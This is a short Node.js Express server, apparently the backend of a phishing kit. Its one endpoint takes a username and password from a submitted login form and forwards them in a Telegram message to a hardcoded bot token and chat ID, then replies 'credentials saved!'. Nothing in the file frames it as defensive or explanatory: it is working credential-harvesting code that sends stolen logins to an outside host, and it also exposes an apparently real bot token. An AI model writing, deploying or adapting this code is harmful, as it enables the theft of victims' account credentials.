require("dotenv").config();
const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");

const app = express();
const PORT = 3000;

// Enable CORS & JSON Parsing
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Handle Form Submission
app.post("/send", async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Missing credentials" });
    }

    const message = `🔹 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;

    try {
        await axios.post(`https://api.telegram.org/bot7032049902:AAGIkgfmvk8Nn8JvZinfxf_ujouyCdXk924/sendMessage`, {
            chat_id: 7293953961,
            text: message
        });

        res.status(200).json({ success: true, message: "credentials saved!" });
    } catch (error) {
        res.status(500).json({ error: "Failed to send message" });
    }
});   

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
